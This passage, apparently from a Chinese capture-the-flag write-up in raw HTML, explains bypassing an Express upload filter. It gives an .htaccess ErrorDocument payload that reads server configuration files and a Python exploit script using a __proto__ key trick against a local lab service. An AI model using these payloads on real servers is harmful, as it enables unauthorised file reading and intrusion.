+</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=nb>Object</span><span class=p>.</span><span class=nx>keys</span><span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>files</span><span class=p>).</span><span class=nx>forEach</span><span class=p>(</span><span class=kd>function</span><span class=p>(</span><span class=nx>key</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>filename</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>files</span><span class=p>[</span><span class=nx>key</span><span class=p>].</span><span class=nx>name</span><span class=p>.</span><span class=nx>toLowerCase</span><span class=p>();</span> 
+</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>position</span> <span class=o>=</span> <span class=nx>filename</span><span class=p>.</span><span class=nx>lastIndexOf</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>position</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=nx>next</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=c1>// 如果没有 . 就下一个文件 这里其实也有个 bypass 点位 也就是上传两个文件 用第一个 无后缀的安全文件 bypass 
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kd>var</span> <span class=nx>ext</span> <span class=o>=</span> <span class=nx>filename</span><span class=p>.</span><span class=nx>substr</span><span class=p>(</span><span class=nx>position</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>allowexts</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;.jpg&#39;</span><span class=p>,</span><span class=s1>&#39;.png&#39;</span><span class=p>,</span><span class=s1>&#39;.jpeg&#39;</span><span class=p>,</span><span class=s1>&#39;.html&#39;</span><span class=p>,</span><span class=s1>&#39;.js&#39;</span><span class=p>,</span><span class=s1>&#39;.xhtml&#39;</span><span class=p>,</span><span class=s1>&#39;.txt&#39;</span><span class=p>,</span><span class=s1>&#39;.realworld&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=nx>allowexts</span><span class=p>.</span><span class=nx>includes</span><span class=p>(</span><span class=nx>ext</span><span class=p>)</span> <span class=p>){</span> <span class=c1>// 确认安全文件名后缀
+</span></span></span><span class=line><span class=cl><span class=c1></span>          <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s1>&#39;Something error.&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>          <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>next</span><span class=p>();</span> <span class=c1>// 所有检查完毕后 就 返回下一个文件
+</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=p>});</span>
+</span></span><span class=line><span class=cl>    <span class=p>};</span>
+</span></span><span class=line><span class=cl>  <span class=p>};</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=看一眼-31338-端口>看一眼 31338 端口</h3><p>这里可以看一眼 31338 端口 然后 curl 一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ curl 127.0.0.1:31338 -v
+</span></span><span class=line><span class=cl>*   Trying 127.0.0.1:31338...
+</span></span><span class=line><span class=cl>* Connected to 127.0.0.1 <span class=o>(</span>127.0.0.1<span class=o>)</span> port <span class=m>31338</span> <span class=o>(</span><span class=c1>#0)</span>
+</span></span><span class=line><span class=cl>&gt; GET / HTTP/1.1
+</span></span><span class=line><span class=cl>&gt; Host: 127.0.0.1:31338
+</span></span><span class=line><span class=cl>&gt; User-Agent: curl/7.81.0
+</span></span><span class=line><span class=cl>&gt; Accept: */*
+</span></span><span class=line><span class=cl>&gt; 
+</span></span><span class=line><span class=cl>* Mark bundle as not supporting multiuse
+</span></span><span class=line><span class=cl>&lt; HTTP/1.1 <span class=m>200</span> OK
+</span></span><span class=line><span class=cl>&lt; Date: Thu, <span class=m>27</span> Jan <span class=m>2022</span> 15:48:27 GMT
+</span></span><span class=line><span class=cl>&lt; Server: Apache/2.4.29 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl>&lt; Last-Modified: Thu, <span class=m>20</span> Jan <span class=m>2022</span> 09:18:15 GMT
+</span></span><span class=line><span class=cl>&lt; ETag: <span class=s2>&#34;31-5d5fffb6aa3c0&#34;</span>
+</span></span><span class=line><span class=cl>&lt; Accept-Ranges: bytes
+</span></span><span class=line><span class=cl>&lt; Content-Length: <span class=m>49</span>
+</span></span><span class=line><span class=cl>&lt; Content-Type: text/html
+</span></span><span class=line><span class=cl>&lt; 
+</span></span><span class=line><span class=cl>* Connection <span class=c1>#0 to host 127.0.0.1 left intact</span>
+</span></span><span class=line><span class=cl>Welcome to my CDN! Execute /readflag to get flag.  
+</span></span></code></pre></td></tr></table></div></div><p>这里就是个 普通 apache 而上面的两个 则是 Express</p><h2 id=思路和利用>思路和利用</h2><p>既然上传这里 有问题 那么就试试上传 看看能不能弄到点什么</p><p>很显然 getshell 的任何 php pl 脚本代码都是不能成功利用的 就是个 简简单单的 纯纯的 Apache 服务器</p><h3 id=第一部分>第一部分</h3><p>既然是 apache 目标, 自然 <a href=https://httpd.apache.org/docs/2.4/howto/htaccess.html>.htaccess</a> apache.conf 这种配置文件 很显然就变成了我们的目标</p><blockquote><p>你或许以为直接 cgi script 进行一把梭就完事了 很显然 这里服务器 默认是没有开启的 (因为他是 docker 而且几乎是默认的 apache )</p></blockquote><p>既然是 Apache 那么翻翻 apache 文档</p><h4 id=errordocument>ErrorDocument</h4><p>知识点 1 <a href=https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#errordocument>ErrorDocument</a> 错误文档 可以看到 context 运行上下文的中存在 .htaccess</p><p>可以这样利用</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ErrorDocument 404 %{file:/etc/apache2/apache2.conf}
+</span></span></code></pre></td></tr></table></div></div><p>保存为 .htaccess 然后传上去</p><p>无用的知识点 <a href=https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-core.html#errorlog>ErrorLog</a> 也能执行命令 但是很显然 上下文环境阻止了你 这里其实可以拿来出题 哈哈哈</p><p>同样</p><ul><li><a href=https://www.docs4dev.com/docs/zh/apache/2.4/reference/mod-mod_log_config.html#customlog>customlog</a></li><li><a href=https://httpd.apache.org/docs/2.4/zh-cn/mod/mod_log_config.html#globallog>globallog</a></li><li><a href=https://httpd.apache.org/docs/2.4/zh-cn/mod/mod_log_forensic.html#forensiclog>forensiclog</a></li><li><a href=https://httpd.apache.org/docs/2.4/zh-cn/mod/mod_log_config.html#transferlog>transferlog</a></li></ul><p>都具有 pipe 形式</p><p>滥用 htaccess 以及其中一些模块的方法 <a href=https://github.com/wireghoul/htshells>https://github.com/wireghoul/htshells</a></p><blockquote><p>额外找到了一些 相关的利用方法</p><p>SetEnv LD_PERLOAD</p><p><a href=https://www.freebuf.com/articles/web/192052.html>https://www.freebuf.com/articles/web/192052.html</a></p><p><a href=https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD>https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p></blockquote><h4 id=上传文件>上传文件</h4><p>这里直接贴代码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>target_ip</span> <span class=o>=</span> <span class=s2>&#34;127.0.0.1&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>target_render_port</span> <span class=o>=</span> <span class=mi>31338</span>
+</span></span><span class=line><span class=cl><span class=n>target_upload_port</span> <span class=o>=</span> <span class=mi>31337</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>upload_file</span> <span class=o>=</span> <span class=s2>&#34;.htaccess&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>normal_file</span> <span class=o>=</span> <span class=s2>&#34;a.txt&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>request_sender_ip</span> <span class=o>=</span> <span class=s2>&#34;172.18.0.1&#34;</span> 
+</span></span><span class=line><span class=cl><span class=n>request_ip</span> <span class=o>=</span> <span class=s2>&#34;::ffff:</span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>request_sender_ip</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 这里是为了好看 跟踪一下请求</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>print_request</span><span class=p>(</span><span class=n>response</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;request form&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=========================================================&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>method</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>header_key</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>headers</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{}</span><span class=s2>: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>header_key</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=n>header_key</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>    <span class=n>body</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>body</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>body</span> <span class=o>==</span> <span class=kc>None</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span> <span class=n>body</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=========================================================&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>print_response</span><span class=p>(</span><span class=n>response</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;response form&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=========================================================&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>header_key</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>{}</span><span class=s2>: </span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>header_key</span><span class=p>,</span> <span class=n>response</span><span class=o>.</span><span class=n>headers</span><span class=p>[</span><span class=n>header_key</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=========================================================&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>md5</span><span class=p>(</span><span class=n>string</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 计算上传点</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>calc_upload_path</span><span class=p>(</span><span class=n>upload_file</span><span class=p>,</span> <span class=n>form_id</span> <span class=p>):</span> <span class=c1># form_id 是无用的 无所谓传什么</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>    # 对应的 js 代码
+</span></span></span><span class=line><span class=cl><span class=s2>    userdir = md5(md5(req.socket.remoteAddress) + sampleFile.md5);
+</span></span></span><span class=line><span class=cl><span class=s2>    userfile = sampleFile.name.toString();
+</span></span></span><span class=line><span class=cl><span class=s2>    if(userfile.includes(&#39;/&#39;)||userfile.includes(&#39;..&#39;)){
+</span></span></span><span class=line><span class=cl><span class=s2>      return res.status(500).send(&#34;Invalid file name&#34;);
+</span></span></span><span class=line><span class=cl><span class=s2>    }
+</span></span></span><span class=line><span class=cl><span class=s2>    uploadPath = &#39;/uploads/&#39; + userdir + &#39;/&#39; + userfile;
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>file_md5</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=nb>open</span><span class=p>(</span><span class=n>upload_file</span><span class=p>,</span><span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>userdir</span>  <span class=o>=</span> <span class=n>md5</span><span class=p>(</span><span class=n>md5</span><span class=p>(</span><span class=n>request_ip</span><span class=p>)</span><span class=o>+</span><span class=n>file_md5</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>userfile</span> <span class=o>=</span> <span class=n>form_id</span> <span class=c1># 这里其实无用 </span>
+</span></span><span class=line><span class=cl>    <span class=c1># upload_path = &#39;/uploads/&#39; + userdir + &#39;/&#39; + userfile # the realworld ctf Env</span>
+</span></span><span class=line><span class=cl>    <span class=n>upload_path</span> <span class=o>=</span> <span class=s1>&#39;/&#39;</span> <span class=o>+</span> <span class=n>userdir</span> <span class=o>+</span> <span class=s1>&#39;/&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>upload_path</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1>## STEP 1 get formid if you need</span>
+</span></span><span class=line><span class=cl>    <span class=n>uplaod_url1</span> <span class=o>=</span> <span class=s2>&#34;http://</span><span class=si>{}</span><span class=s2>:</span><span class=si>{}</span><span class=s2>/&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>target_ip</span><span class=p>,</span> <span class=n>target_upload_port</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>uplaod_url1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>form_id</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;action=&#39;&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;&#39;&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=n>real_form_id</span> <span class=o>=</span> <span class=n>form_id</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;/upload?formid=&#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;you should use this id: &#34;</span><span class=p>,</span><span class=n>real_form_id</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>## STEP 2 upload error file</span>
+</span></span><span class=line><span class=cl>    <span class=c1># 方法 1 多文件上传绕过</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>    # real_form_id = upload_file
+</span></span></span><span class=line><span class=cl><span class=s2>    upload_url2 = &#34;http://</span><span class=si>{}</span><span class=s2>:</span><span class=si>{}</span><span class=s2>/upload?formid=</span><span class=si>{}</span><span class=s2>&#34;.format(target_ip,target_upload_port,real_form_id)
+</span></span></span><span class=line><span class=cl><span class=s2>    upload_file_id = real_form_id
+</span></span></span><span class=line><span class=cl><span class=s2>    files = {
+</span></span></span><span class=line><span class=cl><span class=s2>            real_form_id : open(normal_file,&#39;r&#39;),
+</span></span></span><span class=line><span class=cl><span class=s2>            real_form_id : open(upload_file,&#39;r&#39;),
+</span></span></span><span class=line><span class=cl><span class=s2>    } 
+</span></span></span><span class=line><span class=cl><span class=s2>    # need uplaod 2 same name file as bad request 
+</span></span></span><span class=line><span class=cl><span class=s2>    # 可以这么发包 塞入两个文件 但是很显然 这里前一个文件会被后一个文件盖掉 
+</span></span></span><span class=line><span class=cl><span class=s2>    # 倒是强行可以通过 自己定义写多部分 来进行上传 但是代码复用度不好
+</span></span></span><span class=line><span class=cl><span class=s2>    # 所以你会发现 你最后只上传了一个文件
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=c1># 方法 2 proto 大魔法</span>
+</span></span><span class=line><span class=cl>    <span class=n>upload_url2</span> <span class=o>=</span> <span class=s2>&#34;http://</span><span class=si>{}</span><span class=s2>:</span><span class=si>{}</span><span class=s2>/upload?formid=</span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>target_ip</span><span class=p>,</span><span class=n>target_upload_port</span><span class=p>,</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>files</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;__proto__&#34;</span><span class=p>:</span> <span class=nb>open</span><span class=p>(</span><span class=n>upload_file</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>),</span> 
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;decoy&#34;</span><span class=p>:(</span><span class=s2>&#34;decoy&#34;</span><span class=p>,</span><span class=s2>&#34;random&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>    原理参照一个小哥 在 discord 中发的内容: 如下
+</span></span></span><span class=line><span class=cl><span class=s2>    the __proto__ file is not checked because Object.keys does not include properties from the prototype, 
+</span></span></span><span class=line><span class=cl><span class=s2>    but since the prototype is now an array we can use formid=1 to access that file again in the upload function
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>r2</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>upload_url2</span><span class=p>,</span><span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>print_request</span><span class=p>(</span><span class=n>r2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>print_response</span><span class=p>(</span><span class=n>r2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>## STEP 3 get the response</span>
+</span></span><span class=line><span class=cl>    <span class=n>access_path</span> <span class=o>=</span> <span class=s2>&#34;http://</span><span class=si>{}</span><span class=s2>:</span><span class=si>{}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>target_ip</span><span class=p>,</span><span class=n>target_render_port</span><span class=p>)</span> <span class=o>+</span> \
+</span></span><span class=line><span class=cl>            <span class=n>calc_upload_path</span><span class=p>(</span><span class=n>upload_file</span><span class=p>,</span><span class=n>real_form_id</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;NonExistFile&#34;</span> 
+</span></span><span class=line><span class=cl>    <span class=c1># 强行 在这个目录下 404</span>
+</span></span><span class=line><span class=cl>    <span class=n>r3</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>access_path</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>print_request</span><span class=p>(</span><span class=n>r3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>print_response</span><span class=p>(</span><span class=n>r3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1>## 如果这里你的 .htaccess 文件 成功上传了 就会在这里 拿到 你 .htaccess 文件 ErrorDocument 指向的文件</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=第二部分>第二部分</h3><h4 id=apache2conf审计>apache2.conf审计</h4><blockquote><p>文件很长 可以直接拉到最后 看</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
